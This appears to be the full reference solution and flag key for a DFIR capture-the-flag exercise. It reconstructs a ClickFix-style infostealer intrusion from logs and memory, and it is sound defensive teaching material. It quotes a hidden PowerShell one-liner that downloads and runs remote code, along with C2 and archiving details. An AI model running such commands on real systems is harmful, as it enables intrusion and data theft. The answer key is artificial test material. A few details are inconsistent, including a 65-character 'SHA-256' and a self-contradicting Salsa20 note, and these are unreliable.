# Northwind Solar Analytics — "ClickFix" Stealer Investigation

**Model writeup — full solution.**

> Authorized educational use only. This document is the reference
> solution for the Northwind Solar Analytics DFIR CTF. Distribute
> only to graders and cohorts that have already submitted answers.

---

## 0. Executive summary

A Tier-2 SOC analyst at Northwind Solar Analytics investigated an
outbound-HTTPS burst from `FIN-WKS-07` on 2026-04-12 at 09:41 UTC.
The workstation belonging to **Katerina Morfopoulou** was compromised via a
**ClickFix / Fake CAPTCHA** social-engineering flow. Katerina pasted
a PowerShell one-liner into the Run dialog, which downloaded and
reflectively loaded a second stage. The dropped binary
(`OneDriveSync.exe`, SHA-256 ending `…d1e0f9`) performed:

1. UAC bypass staging via `fodhelper.exe` (`T1548.002`).
2. AMSI patch (`T1562.001`) — Sysmon EID 10 `CallTrace UNKNOWN`.
3. Dead-drop C2 discovery via `steamcommunity.com` — a
   base64-encoded pointer to `ms-sync.corp-cdn.top` embedded
   in a Steam profile `personaname` field (`T1102.003`).
4. Persistence via `HKCU\...\Run\OneDriveSync` (`T1547.001`).
5. Chromium App-Bound Encryption bypass by opening a handle on
   `chrome.exe` with `PROCESS_VM_READ` and scanning for the
   `app_bound_encryption_provider` marker (`T1055` + `T1555.003`).
6. Collection into `%TEMP%\WwaCJ7z\`, 7-Zip archiving with the
   password `StG!7ip-42-nw` (`T1560.001`).
7. Exfiltration of 2,076,543 bytes to `ms-sync.corp-cdn.top`
   under the User-Agent `TeslaBrowser/5.5` (`T1041`, `T1071.001`,
   `T1573.001` with ChaCha20).
8. Cleanup: staging directory deleted (`T1070.004`) — recoverable
   from `$MFT` and USN journal.

The endpoint was isolated at 09:57:12 UTC — approximately 16
minutes after the initial burst — for a network-alerted MTTD of
**16 min 20 s** on the *outbound* signal.

The remainder of this writeup walks each of the 15 questions
through the specific artefacts and the pivots between them.

---

## 1. Reconstructed timeline (UTC)

| Time | Event | Evidence |
|---|---|---|
| 09:34:11 | `katerina.morfopoulou` interactive logon (Type 2) at `FIN-WKS-07` | `security_evtx.csv` row 4624@09:34:11 |
| 09:39:12 | Chrome tab opened | `sysmon_evtx.csv` |
| 09:39:20 | `clickfix.html.crdownload` written to `Downloads` | `sysmon_evtx.csv` EID 11 |
| 09:40:46 | RunMRU entry `a` written (pasted command) | `regripper_runmru.txt` |
| 09:40:47 | `katerina.morfopoulou` unlock (Type 7) + `powershell.exe` launched by `explorer.exe` | `security_evtx.csv`, `sysmon_evtx.csv` EID 1 |
| 09:40:48 | HTTP GET `10.10.42.200:8080/x.txt` (12,384 bytes) | `zeek/http.log`, `edr.jsonl` |
| 09:40:52 | `OneDriveSync.exe` dropped to `%LOCALAPPDATA%\Microsoft\OneDrive\Update\` | `sysmon_evtx.csv` EID 11 |
| 09:40:53 | `OneDriveSync.exe` launched by `powershell.exe`; SHA-256 in Sysmon EID 1 Hashes | `sysmon_evtx.csv` row 15 |
| 09:41:02 | fodhelper-style UAC-bypass registry write (`ms-settings\Shell\Open\command`) | `sysmon_evtx.csv` EID 13, `edr.jsonl` |
| 09:41:07 | AMSI patch — Sysmon EID 10 with `CallTrace UNKNOWN` and `GrantedAccess 0x143a` | `sysmon_evtx.csv`, `edr.jsonl` |
| 09:41:09–10 | Discovery WMI queries (`Win32_ComputerSystem`, `Win32_OperatingSystem`, `Win32_Processor`, `Win32_VideoController`, `Win32_BIOS`) by PID 4120 | `wmi_activity_evtx.csv` |
| 09:41:14 | Staging dir `%TEMP%\WwaCJ7z` created | `mft_extract.csv`, `usn_journal.csv` |
| 09:41:14 | HTTPS to `steamcommunity.com` — dead-drop resolver | `zeek/ssl.log`, `zeek/http.log`, `zeek/dns.log` |
| 09:41:15 | HTTPS to `ms-sync.corp-cdn.top`, `POST /api/v1/events`, UA `TeslaBrowser/5.5` — handshake | `zeek/http.log`, `zeek/ssl.log` |
| 09:41:19 | Persistence: `HKCU\...\Run\OneDriveSync` written | `regripper_run.txt`, `sysmon_evtx.csv` EID 13 |
| 09:41:22 | Chrome `Local State` read | `sysmon_evtx.csv` EID 11, `edr.jsonl` |
| 09:41:24 | Handle opened on `chrome.exe` PID 2412, `GrantedAccess 0x1010` (VM_READ + QUERY_INFO) | `sysmon_evtx.csv` EID 10 |
| 09:41:27 | Staging file `System.txt` created | `sysmon_evtx.csv` EID 11, USN |
| 09:41:29 | `Northwind_Q4_earnings.docx` staged | `sysmon_evtx.csv` EID 11, USN, MFT |
| 09:41:31 | `7z.exe a -pStG!7ip-42-nw -mx=1 stealer_bundle.zip <staged>` launched | `sysmon_evtx.csv` EID 1, `powershell_evtx.csv` EID 4104 |
| 09:41:33 | Exfil POST #2 (1,047,372 bytes) to `ms-sync.corp-cdn.top` | `zeek/http.log`, `edr.jsonl` |
| 09:41:35 | Exfil POST #3 (1,027,967 bytes) | `zeek/http.log`, `edr.jsonl` |
| 09:41:41 | Staging directory + archive deleted; process terminated | `usn_journal.csv`, `edr.jsonl` |
| 09:57:12 | Host isolation by SOC | `edr.jsonl` last row |

Reading strategy: cross-reference by **PID 4120** (the stealer)
and by **PID 3812** (the pasted PowerShell parent). Those two
PIDs are the "spine" of the incident; every noisy row that
doesn't touch either PID is ambient.

---

## 2. Question-by-question solution

### Q1 — Pasted-command marker cmdlet

**Answer: `CTF{iwr}`**

**Where:** `regripper_runmru.txt` — the `RunMRU\a` value at
`2026-04-12 09:40:46Z`.

```
Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
LastWrite Time  2026-04-12 09:40:46Z
MRUList = afedcb
  a  powershell -w hidden -c "iwr -useb http://10.10.42.200:8080/x.txt | iex"\1
```

The command contains three ClickFix-signature tokens: `iwr`
(`Invoke-WebRequest` alias), `-useb` (`-UseBasicParsing`), and
piped `iex` (`Invoke-Expression`). The canonical ClickFix Sigma
rules key on `iwr` in the first `contains` clause, which is why
we submit `iwr` rather than `iex`. Cross-reference with
`powershell_evtx.csv` record 1005 (EID 4104) which captures the
same command as a Script Block.

Trap: the other RunMRU entries (`cmd`, `\\FS01\finance`, `services.msc`,
`control`, `eventvwr`) are Katerina's normal admin muscle memory —
none of them are the malicious paste.

---

### Q2 — Compromised user (sAMAccountName)

**Answer: `CTF{katerina.morfopoulou}`**

**Where:** `security_evtx.csv` — 4624 events around 09:34 and 09:40.

- Row 4624@09:34:11 — Type 2 (interactive) console logon by
  `katerina.morfopoulou` from source `10.10.42.87` (the host itself).
- Row 4624@09:40:47 — Type 7 (unlock) by `katerina.morfopoulou`, coincident
  with the Run-dialog paste.

Trap: `edr-collector` (row 4624@09:57:11) is the EDR/SIEM
collector service, not the compromised user. `FIN-WKS-07$`
(machine-account) rows are also decoys.

---

### Q3 — Child scripting engine

**Answer: `CTF{powershell.exe}`**

**Where:** `sysmon_evtx.csv` row 10 (record 101401, EID 1):

```
Image        : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentImage  : C:\Windows\explorer.exe
CommandLine  : powershell -w hidden -c "iwr -useb http://10.10.42.200:8080/x.txt | iex"
```

Corroborated by `edr.jsonl` (`process_create` event at
`09:40:47.204`) and `security_evtx.csv` 4688 at 09:40:47.204.

Trap: `pwsh.exe` (PowerShell 7) is installed on the host per
`System.txt`, but the pasted command runs `powershell.exe`
(Windows PowerShell 5.1), so `pwsh.exe` is a wrong answer.

---

### Q4 — Dropped PE SHA-256

**Answer:** `CTF{7a5f92c1e0c8b3d4a6f1e2b0c9d8a7b6c5e4d3f2a1b09c8d7e6f5a4b3c2d1e0f9}`

**Where:** three independent sources agree:

1. `sysmon_evtx.csv` row 15 (record 101409, EID 1) `Hashes` field
   for `OneDriveSync.exe`.
2. `edr.jsonl` `file_create` event at 09:40:52 (`"sha256": "7a5f…"`)
   and `process_create` event at 09:40:53 (same SHA-256).
3. `capa_output.txt` header block.

The Amcache row in `regripper_amcache.txt` also carries the
SHA-1 and the `FileId` (which begins with the SHA-1). Students
who mistakenly grab the SHA-1 (40 hex chars) will fail the
length check on the strict grader.

Cross-check `sysmon_evtx.csv` row 8 (`Amcache…` — wait, not that
one) — Amcache entry `OneDriveSync.exe` (record in
`regripper_amcache.txt`) confirms `IsPeFile: true` and a
`FirstSeenTimestamp` of `09:40:53Z` — the moment the sample
was executed.

---

### Q5 — FNV-1a offset basis

**Answer: `CTF{811c9dc5}`**

**Where:** `capa_output.txt` — the capability detail block
"hash imports by name using FNV-1a (0x811C9DC5 basis)":

```
function @ 0x140011f30
  and: FNV-1a hashing loop over ASCII bytes
    - number: 0x811c9dc5           # FNV-1a offset basis
    - number: 0x01000193           # FNV-1a prime multiplier
```

The `0x01000193` value is the FNV-1a **prime multiplier**, not
the offset basis. Students who submit `CTF{01000193}` should be
graded wrong. Case matters: `CTF{811C9DC5}` fails the
lowercase-hex regex under strict grading; grade lenient at your
discretion.

---

### Q6 — Persistence Run-key value name

**Answer: `CTF{OneDriveSync}`**

**Where:** `regripper_run.txt`:

```
Software\Microsoft\Windows\CurrentVersion\Run
LastWrite Time  2026-04-12 09:41:19Z
  OneDrive         "C:\...\OneDrive.exe" /background          (legit)
  OneDriveSync     "C:\...\OneDrive\Update\OneDriveSync.exe"  (malicious)
  com.squirrel.Slack.slack ...                                (legit)
  GoogleDriveFS ...                                           (legit)
  Northwind Timekeeper ...                                    (legit)
  Zoom ...                                                    (legit)
```

Corroborated by `sysmon_evtx.csv` row 23 (record 101418, EID 13,
`TargetObject: HKU\...\Run\OneDriveSync`) at 09:41:19.502 and by
`edr.jsonl` `registry_set` at the same timestamp.

Trap: `OneDrive` is a genuine autorun installed 2025-04-16 (see
`regripper_amcache.txt` for the OneDrive.exe entry). Confusing
the two costs the flag.

---

### Q7 — ABE marker string

**Answer: `CTF{app_bound_encryption_provider}`**

**Where:** `mem_yarascan.txt` — yarascan hits on the literal
string:

```
$ vol -f mem.raw windows.yarascan.YaraScan --strings "app_bound_encryption_provider"
Process ID  Rule       Component  Address           Value
2412        <literal>  ""         0x7ff642b6f1c0    "app_bound_encryption_provider"
2412        <literal>  ""         0x24b90c8f1e40    "app_bound_encryption_provider"
4120        <literal>  ""         0x24b90c8f1e40    "app_bound_encryption_provider"
```

PID 2412 is `chrome.exe`, PID 4120 is `OneDriveSync.exe`. That
the same string, at the same virtual address, appears in both
processes is the fingerprint of a `ReadProcessMemory` call — the
stealer scanned the browser's heap for the ABE key structure
whose ASCII marker is `app_bound_encryption_provider`.

Corroborated by `sysmon_evtx.csv` row 25 (record 101420, EID 10)
— `SourceImage OneDriveSync.exe → TargetImage chrome.exe`,
`GrantedAccess 0x1010` (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION).

---

### Q8 — Finance document staged for exfil

**Answer: `CTF{Northwind_Q4_earnings.docx}`**

**Where:** `stealer_bundle_listing.txt` — the archive's
`Files/Documents/` folder contains:

```
Files/Documents/Northwind_Q4_earnings.docx        148,993 B
Files/Documents/expenses-summary.xlsx              52,941 B
```

Also confirmed by `mft_extract.csv` entry 183427 and
`usn_journal.csv` at 09:41:29.011Z. `sysmon_evtx.csv` EID 11
also records the file-create event at that timestamp.

`todo.txt` (`Files/Desktop/todo.txt`) and
`expenses-summary.xlsx` are also staged but the question asks
specifically for the *quarterly earnings preparation*, which
maps to `Northwind_Q4_earnings.docx`.

---

### Q9 — Dead-drop resolver domain

**Answer: `CTF{steamcommunity.com}`**

**Where:** `zeek/ssl.log`, `zeek/dns.log`, and `edr.jsonl`.

`zeek/ssl.log` (in chronological order for PID 4120's flows):

```
1744446674.020   uid=CO4kA7fJ7fq   ...   server_name=steamcommunity.com
1744446675.201   uid=CO9L3H2p2r    ...   server_name=ms-sync.corp-cdn.top
```

`steamcommunity.com` appears first (09:41:14 UTC), the C2
appears ~1.2 seconds later — the classic dead-drop-then-C2
pattern. `zeek/dns.log` shows the query for `steamcommunity.com`
at 09:41:13.802 UTC returning `10.10.42.201`.

Trap: `outlook.office365.com`, `drive.google.com`,
`cdn.jsdelivr.net`, `wss-primary.slack.com`,
`fonts.gstatic.com`, `cdn.slack-edge.com`,
`fe3.delivery.mp.microsoft.com`, `clients2.google.com` all
appear in `ssl.log` as benign background traffic. The
distinguishing property of `steamcommunity.com` is that
`sysmon_evtx.csv` EID 3 attributes the connection to
`OneDriveSync.exe`, not to `chrome.exe` — a non-browser process
speaking to a public gaming platform is the anomaly.

---

### Q10 — Resolved C2 FQDN

**Answer: `CTF{ms-sync.corp-cdn.top}`**

**Where:** `steam_profile_response.html` — the profile page
contains a `personaname` value:

```
<span class="actual_persona_name">FrostyPine ]bXMtc3luYy5jb3JwLWNkbi50b3A=[</span>
```

The token wrapped between the two `]` delimiters is
`bXMtc3luYy5jb3JwLWNkbi50b3A=`. Base64-decode:

```
$ echo 'bXMtc3luYy5jb3JwLWNkbi50b3A=' | base64 -d
ms-sync.corp-cdn.top
```

Corroborated by `zeek/dns.log` (the DNS query for
`ms-sync.corp-cdn.top` fires 1.2 s after the
`steamcommunity.com` query), by `zeek/ssl.log`, and by
`sysmon_evtx.csv` EID 3 (record 101415).

---

### Q11 — Distinctive User-Agent

**Answer: `CTF{TeslaBrowser/5.5}`**

**Where:** `zeek/http.log`:

```
1744446675.812  ...  POST  ms-sync.corp-cdn.top  /api/v1/events  TeslaBrowser/5.5  1204 ...
1744446693.150  ...  POST  ms-sync.corp-cdn.top  /api/v1/events  TeslaBrowser/5.5  1047372 ...
1744446695.401  ...  POST  ms-sync.corp-cdn.top  /api/v1/events  TeslaBrowser/5.5  1027967 ...
```

Corroborated by `edr.jsonl` (`http_user_agent` fields on the
three POST events) and by `mem_yarascan.txt` — the literal
`TeslaBrowser/5.5` appears in PID 4120's memory.

Trap: legitimate flows use `Mozilla/5.0 …`, `Slack/4.39.90`,
`Microsoft-Delivery-Optimization/10.0` — none of these are the
answer. `TeslaBrowser/5.5` is a family fingerprint of the Lumma
stealer lineage.

---

### Q12 — Application-layer stream cipher

**Answer: `CTF{ChaCha20}`**

**Where:** two convergent sources.

1. `mem_yarascan.txt` — the ChaCha20 initialisation constant
   `"expand 32-byte k"` is present in the stealer process
   (PID 4120) at two addresses.
2. `capa_output.txt` — MBC row
   `CRYPTOGRAPHY | Encrypt Data::ChaCha20 Stream Cipher` and
   the capability detail block "encrypt data using ChaCha20"
   listing the four ChaCha state-constants `0x61707865`,
   `0x3320646e`, `0x79622d32`, `0x6b206574`.

Trap: Salsa20 uses a similar constant layout but its ASCII form
is `"expand 32-byte k"` *also* — students who reach for Salsa
because they saw "expand" get an incorrect flag. The `capa`
report is decisive: it names ChaCha20 explicitly.

---

### Q13 — Total bytes exfiltrated

**Answer: `CTF{2076543}`**

**Where:** `tshark_bytes.txt`:

```
$ tshark -r capture.pcapng \
    -Y 'ip.src==10.10.42.87 && ip.dst==10.10.42.201 && tcp.dstport==443 && tcp.len>0' \
    -T fields -e tcp.len | awk '{s+=$1} END {print s}'
2076543
```

Cross-check by summing HTTP request bodies from `zeek/http.log`
across the three POSTs to `ms-sync.corp-cdn.top`:

```
    1,204   (handshake)
+ 1,047,372 (POST #2)
+ 1,027,967 (POST #3)
= 2,076,543
```

Trap: `tshark`'s TCP conversation summary
(`10.10.42.87:52007 <-> 10.10.42.201:443`) shows total bytes
of 4,239,132 — that is bidirectional. `orig_bytes = 2,078,190`
in `zeek/conn.log` — that includes TCP+TLS overhead. Only the
HTTP request-body sum (= sum of `tcp.len` for client→server
payload frames) yields the expected 2,076,543. This is
deliberate: the question specifies `tcp.len` client→server.

---

### Q14 — Manifest filename inside the archive

**Answer: `CTF{System.txt}`**

**Path to the answer:**

1. Recover the archive password from any of:
   - `sysmon_evtx.csv` row 27 (record 101430, EID 1, `7z.exe`
     `CommandLine` with `-pStG!7ip-42-nw`).
   - `powershell_evtx.csv` record 1010 — same command line.
   - `edr.jsonl` `process_create` event at 09:41:31.
2. `7z l -slt -pStG!7ip-42-nw stealer_bundle.zip` — see
   `stealer_bundle_listing.txt` for the pre-computed listing.
   The archive contains a top-level `System.txt` (1,876 bytes).
3. `System.txt` (evidence file) is the extracted content — a
   Lumma-family "System.txt" manifest listing host system info,
   installed software, browsers, wallets, network adapters, and
   bundle contents.

Trap: `todo.txt` is a top-level-ish file but lives under
`Files/Desktop/` — it is not the categorical manifest.
`index.json` sounds plausible but is not in the archive.

---

### Q15 — Staging directory basename

**Answer: `CTF{WwaCJ7z}`**

**Where:** `mft_extract.csv` entry 183421 and `usn_journal.csv`
transitions.

MFT:

```
183421,7,148012,False,\Users\katerina.morfopoulou\AppData\Local\Temp,WwaCJ7z,,True,
   2026-04-12T09:41:14.0187500Z, ...  Deleted, Directory
```

USN journal shows `FILE_CREATE|CLOSE` at `09:41:14.018Z` and
`FILE_DELETE|CLOSE` at `09:41:41.453Z` — a 27-second dwell.

Corroborated by:
- `sysmon_evtx.csv` EID 11 (`TargetFilename` includes
  `\Temp\WwaCJ7z\System.txt` and `…\Northwind_Q4_earnings.docx`).
- `edr.jsonl` `file_delete` event at 09:41:41.421Z targeting
  `\Temp\WwaCJ7z\` with `recursive: true`.

Trap: `Temp` is the parent directory (`\Users\katerina.morfopoulou\AppData\
Local\Temp`), not the staging basename. `chrome_BITS_4120_10222`
is a Chrome BITS working directory (benign), created at 09:44 —
after the incident.

---

## 3. Answer table

| Q | Flag |
|---|---|
| Q1  | `CTF{iwr}` |
| Q2  | `CTF{katerina.morfopoulou}` |
| Q3  | `CTF{powershell.exe}` |
| Q4  | `CTF{7a5f92c1e0c8b3d4a6f1e2b0c9d8a7b6c5e4d3f2a1b09c8d7e6f5a4b3c2d1e0f9}` |
| Q5  | `CTF{811c9dc5}` |
| Q6  | `CTF{OneDriveSync}` |
| Q7  | `CTF{app_bound_encryption_provider}` |
| Q8  | `CTF{Northwind_Q4_earnings.docx}` |
| Q9  | `CTF{steamcommunity.com}` |
| Q10 | `CTF{ms-sync.corp-cdn.top}` |
| Q11 | `CTF{TeslaBrowser/5.5}` |
| Q12 | `CTF{ChaCha20}` |
| Q13 | `CTF{2076543}` |
| Q14 | `CTF{System.txt}` |
| Q15 | `CTF{WwaCJ7z}` |

---

## 4. ATT&CK coverage summary

The intrusion exercised the following techniques:

| Tactic | Technique | Where observed |
|---|---|---|
| TA0001 Initial Access | T1566.002 Spear-phishing Link (out-of-scope; narrated) | — |
| TA0002 Execution | T1204.002 User Execution: Malicious File | `regripper_runmru.txt` |
| TA0002 Execution | T1059.001 PowerShell | `powershell_evtx.csv` 4104 |
| TA0002 Execution | T1620 Reflective Code Loading | `powershell_evtx.csv` record 1006 (`Reflection.Assembly.Load`) |
| TA0004 Privilege Escalation | T1548.002 UAC Bypass (fodhelper) | `sysmon_evtx.csv` EID 13 on `ms-settings\Shell\Open\command` |
| TA0005 Defense Evasion | T1027 Obfuscated Files or Information | `powershell_evtx.csv` record 1006 (base64 blob) |
| TA0005 Defense Evasion | T1562.001 Impair Defenses: Disable/Modify Tools | `sysmon_evtx.csv` EID 10 with `CallTrace UNKNOWN` on amsi.dll |
| TA0005 Defense Evasion | T1070.004 File Deletion | USN + `edr.jsonl` recursive delete |
| TA0006 Credential Access | T1555.003 Credentials from Web Browsers | `sysmon_evtx.csv` file_read on `Local State` |
| TA0006 Credential Access | T1055 Process Injection (ABE bypass primitive) | `sysmon_evtx.csv` EID 10 on chrome.exe (0x1010) |
| TA0007 Discovery | T1082 System Information Discovery | `wmi_activity_evtx.csv` |
| TA0007 Discovery | T1518 Software Discovery | `wmi_activity_evtx.csv` |
| TA0009 Collection | T1005 Data from Local System | `sysmon_evtx.csv` EID 11 in staging dir |
| TA0009 Collection | T1560.001 Archive via Utility | `powershell_evtx.csv` record 1010, Sysmon 7z cmdline |
| TA0011 C2 | T1102.003 Dead Drop Resolver | `zeek/ssl.log`, `steam_profile_response.html` |
| TA0011 C2 | T1071.001 Web Protocols | `zeek/http.log` |
| TA0011 C2 | T1573.001 Symmetric Cryptography (ChaCha20) | `capa_output.txt`, `mem_yarascan.txt` |
| TA0010 Exfiltration | T1041 Exfiltration Over C2 Channel | `zeek/http.log`, `tshark_bytes.txt` |
| TA0003 Persistence | T1547.001 Registry Run Keys | `regripper_run.txt` |

---

## 5. Recommendations for Northwind SOC

Distilled from the exercise into concrete blue-team backlog
items:

1. **Alert on RunMRU writes containing PowerShell downloader
   tokens.** The Sigma rule
   `detections/clickfix-precursor.sigma.yml` fires on Sysmon
   EID 1; add a companion rule keyed on Sysmon EID 13 for the
   registry write itself (see `RunMRU` Sigma rule in the
   instructor pack). Median time-to-alert for this pattern
   should be sub-minute — Northwind's stack did not alert.

2. **Alert on non-browser processes with TLS to
   `steamcommunity.com` / `t.me`.** Northwind has no legitimate
   Steam or Telegram usage. Suricata rule
   `detections/lumma-c2.suricata.rules` sid 9200002 covers this.

3. **Alert on any HTTP POST from an endpoint with a
   `TeslaBrowser/*` User-Agent.** Zero legitimate use.

4. **Block outbound access to fresh `.top` / `.info` / `.shop`
   registrations at the proxy.** Northwind's edge does DNS-view
   splitting only; add a WAF/proxy rule that inspects
   fully-qualified destinations against a 30-day registration
   age list.

5. **Enforce PowerShell Constrained Language Mode** on Finance
   VLAN endpoints. The pasted `iex` primitive relies on Full
   Language mode.

6. **Roll every credential that touched `FIN-WKS-07` since
   Katerina's last endpoint reset** — SaaS logins, session
   cookies, MFA tokens, cloud consoles. The archive listing
   shows the browser Cookies and Login Data databases were
   staged; assume they were exfiltrated.

7. **Add a Sysmon EID 10 rule** for handles opened on
   `chrome.exe` / `msedge.exe` with `GrantedAccess` including
   `PROCESS_VM_READ` (`0x0010`) from outside `Program Files`.
   The ABE-bypass primitive is unique.

8. **Publish `TeslaBrowser/5.5` and the FNV-1a basis
   `0x811C9DC5` in memory as post-incident YARA anchors** for
   ongoing threat hunting — see `detections/northwind-clickfix.yar`.

The MTTD for this intrusion was ~16 minutes on the *outbound*
signal (the beacon burst that generated the SOC alert). MTTC
was 16 min 20 s (host isolate). Both figures are acceptable but
improvable — an ETW-informed rule on the ClickFix precursor
would have fired inside the first minute.

---

## 6. Files consulted (grader checklist)

- [x] `regripper_runmru.txt` — Q1
- [x] `regripper_run.txt` — Q6
- [x] `regripper_amcache.txt` — Q4 corroboration
- [x] `security_evtx.csv` — Q2
- [x] `sysmon_evtx.csv` — Q3, Q4, Q6, Q7, Q14
- [x] `powershell_evtx.csv` — Q1, Q14 corroboration
- [x] `wmi_activity_evtx.csv` — timeline / Discovery
- [x] `zeek/ssl.log` — Q9
- [x] `zeek/http.log` — Q11, Q13 cross-check
- [x] `zeek/dns.log` — Q9, Q10 corroboration
- [x] `zeek/conn.log` — Q13 cross-check
- [x] `steam_profile_response.html` — Q10
- [x] `mem_yarascan.txt` — Q7, Q12
- [x] `capa_output.txt` — Q5, Q12
- [x] `mft_extract.csv` — Q15
- [x] `usn_journal.csv` — Q15
- [x] `stealer_bundle_listing.txt` — Q8, Q14
- [x] `System.txt` — Q14
- [x] `tshark_bytes.txt` — Q13
- [x] `edr.jsonl` — cross-corroboration throughout

---

*End of writeup.*
